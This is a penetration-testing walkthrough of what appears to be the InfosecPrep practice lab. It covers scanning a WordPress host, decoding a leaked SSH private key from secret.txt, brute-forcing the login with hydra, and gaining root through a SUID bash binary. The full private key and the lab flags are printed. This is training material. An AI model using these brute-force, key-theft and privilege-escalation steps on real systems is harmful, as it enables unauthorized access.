# Recon

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# nmap -sT -sV -n 192.168.206.89  -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-04 22:42 CST
Warning: 192.168.206.89 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.206.89
Host is up (0.11s latency).
Not shown: 64105 closed ports, 1427 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.66 seconds
```

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/InfosecPrep/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# nmap -sT -sV --script http-enum -n 192.168.206.89 -p 80 --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-04 22:45 CST
Nmap scan report for 192.168.206.89
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.4.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/InfosecPrep/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/InfosecPrep/img/3.png)

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pVUWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xxMCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpYS0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQaUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVjMXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNyaFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxSd3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1MwNzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZTHdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlTWldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpCM0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZudFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Npc0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05iVjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlBcEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlqNVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1SnlzNEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZGcWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZlMWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1rbwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhKeGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09rTmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpPcTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVVblpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00yCnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhBSncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1HbnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJKTVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNpa2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AKT2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJxdjlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNSaERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVyZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgprdW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBhbWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==" | base64 -d 
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/InfosecPrep/img/4.png)

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# wpscan --url http://192.168.206.89 --enumerate p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.206.89/ [192.168.206.89]
[+] Started: Thu Nov  4 23:03:22 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.206.89/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.206.89/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.206.89/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.206.89/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.206.89/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://192.168.206.89/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.206.89/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.206.89/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://192.168.206.89/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.206.89/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Nov  4 23:03:34 2021
[+] Requests Done: 30
[+] Cached Requests: 6
[+] Data Sent: 6.453 KB
[+] Data Received: 326.028 KB
[+] Memory used: 163.34 MB
[+] Elapsed time: 00:00:12
```

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# wfuzz -c -t 500 --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  http://192.168.206.89/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.206.89/FUZZ
Total requests: 13366

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000002:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/%d0%af%d0%bd%d0%b4%d0%b5%d0%ba%d1%81%d0%a4%d0%be%d1%82%d0%ba%d0%b8
000003:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/%d0%b1%d1%83%d1%82%d0%be%d0%bd-%d0%b7%d0%b0-%d1%81%d0%bf%d0%be%d0%
000004:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/%d0%bf%d1%80%d0%b0%d0%b2%d0%be%d1%81%d0%bb%d0%b0%d0%b2%d0%bd%d1%8b
000283:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/admins-please-remove-the-wp-traffic-plugin-it-is-not-a-plugin-to-i
004592:  C=500      0 L	       0 W	      0 Ch	  "wp-content/plugins/hello.php/"
003102:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/editorbg-%d0%b7%d0%b0-%d1%87%d0%b8%d1%81%d1%82-%d0%b1%d1%8a%d0%bb%
005994:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/make-me-social-automatically-submit-posts-to-delicious-twitter-tum
004591:  C=500      0 L	       0 W	      0 Ch	  "wp-content/plugins/hello.php"
007923:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/put-the-category-selector-back-to-the-sidebar-of-the-post-page-bef
008317:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/remove-category-permalinks-from-url-without-htaccess-and-301-redir
009740:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/subscription-dna-subscription-billing-and-membership-management-pl
010332:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/tradueix2en-traductor-catala-angles-catalan-to-english-translator/
010531:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/twitter-brand-sponsors-sidebar-widget-by-mashable-and-danzarrella/
011222:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/will-the-admins-please-remove-the-wp-traffic-plugin-it-is-not-a-pl
011292:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/wordpress-23-compatible-wordpress-delicious-daily-synchronization-
011589:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/wp-%eb%8b%a4%ec%9d%8c-%eb%b8%94%eb%a1%9c%ea%b1%b0-%eb%89%b4%ec%8a%
012991:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/wpmu-fast-verification-for-google-webmaster-tools-and-yahoo-site-e
002742:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/digital-scientists%e2%80%99-image-commenting-plugin-for-wordpress/
001842:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/chinese-word-count%e4%b8%ad%e6%96%87%e5%ad%97%e6%95%b0%e7%bb%9f%e8
001779:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/ceske-a-slovenske-linkovaci-sluzby-directory-for-svn-cz-sk-sociabl
000469:  C=200      0 L	       0 W	      0 Ch	  "wp-content/plugins/akismet/"
000217:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/addthischina-%e6%94%b6%e8%97%8f%e5%88%86%e4%ba%ab%e6%8c%89%e9%92%a
Total time: 56.15334
Processed Requests: 13366
Filtered Requests: 13363
Requests/sec.: 238.0267
```

http://192.168.206.89/wp-content/plugins/akismet/changelog.txt
http://192.168.206.89/wp-content/plugins/akismet/readme.txt
4.1.5

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# searchsploit akismet
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                                      | php/webapps/37902.php
WordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                         | php/webapps/30036.html
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

### HYDRA Brute Force WP

https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.89 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.206.89%2Fwp-admin%2F&testcookie=1:is incorrect"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-11-04 23:53:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task
[DATA] attacking http-post-form://192.168.206.89:80//wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.206.89%2Fwp-admin%2F&testcookie=1:is incorrect
[STATUS] 470.00 tries/min, 470 tries in 00:00h, 0 to do in 01:00h, 14343929 active
[STATUS] 470.33 tries/min, 1411 tries in 00:00h, 0 to do in 03:00h, 14342988 active
[STATUS] 472.71 tries/min, 3309 tries in 00:00h, 0 to do in 07:00h, 14341090 active
[80][http-post-form] host: 192.168.206.89   login: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-11-05 00:03:14
```

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# python3 /opt/dirsearch/dirsearch.py -u  http://192.168.206.89 -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-11-04_23-10-29.log

Target: http://192.168.206.89

[23:10:30] Starting: 
[23:11:16] 301 -    0B  - /index.php  ->  http://192.168.206.89/
[23:11:17] 301 -  321B  - /javascript  ->  http://192.168.206.89/javascript/
[23:11:19] 200 -   19KB - /license.txt
[23:11:33] 200 -    7KB - /readme.html
[23:11:33] 200 -   36B  - /robots.txt
[23:11:46] 301 -  319B  - /wp-admin  ->  http://192.168.206.89/wp-admin/
[23:11:47] 302 -    0B  - /wp-admin/  ->  http://192.168.206.89/wp-login.php?redirect_to=http%3A%2F%2F192.168.206.89%2Fwp-admin%2F&reauth=1
[23:11:47] 200 -    1KB - /wp-admin/install.php
[23:11:47] 500 -    3KB - /wp-admin/setup-config.php
[23:11:47] 200 -    0B  - /wp-config.php
[23:11:47] 301 -  321B  - /wp-content  ->  http://192.168.206.89/wp-content/
[23:11:47] 200 -    0B  - /wp-content/
[23:11:47] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
[23:11:47] 301 -  322B  - /wp-includes  ->  http://192.168.206.89/wp-includes/
[23:11:47] 500 -    0B  - /wp-includes/rss-functions.php
[23:11:47] 200 -    5KB - /wp-login.php
[23:11:47] 200 -   45KB - /wp-includes/
[23:11:48] 405 -   42B  - /xmlrpc.php

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# nikto -h http://192.168.206.89
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.206.89
+ Target Hostname:    192.168.206.89
+ Target Port:        80
+ Start Time:         2021-11-04 23:02:08 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://192.168.206.89/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x24 0x5a9fc9fae6fe2 
+ Entry '/secret.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7542 requests: 3 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-11-04 23:18:33 (GMT-6) (985 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# curl http://192.168.206.89/secret.txt | base64 -d > id_rsa
root@kali:/OSCPv3/offsec_pg/InfosecPrep# nano id_rsa
root@kali:/OSCPv3/offsec_pg/InfosecPrep# chmod 600 id_rsa 
```

## SSH TCP/22

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# ssh oscp@192.168.206.89 -i id_rsa 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Nov 2021 05:35:12 AM UTC

  System load:  0.0                Processes:             210
  Usage of /:   25.4% of 19.56GB   Users logged in:       0
  Memory usage: 59%                IPv4 address for eth0: 192.168.206.89
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash-5.0$ whoami
oscp
```

```console
-bash-5.0$ ls
ip  local.txt
-bash-5.0$ cat local.txt 
10cb7069319b8de469e8dfccf13696bc
-bash-5.0$ 
```
# Privilege escalation 1

```console
-bash-5.0$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/8790/usr/lib/snapd/snap-confine
/snap/snapd/8140/usr/lib/snapd/snap-confine
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/bash
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
```

```console
-bash-5.0$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# 
bash-5.0# cd /root/
bash-5.0# ls
fix-wordpress  flag.txt  proof.txt  snap
bash-5.0# cat proof.txt 
0ff90a4e5adf88188560b5a1f405c4b7
```

# Privilege escalation 2

```console
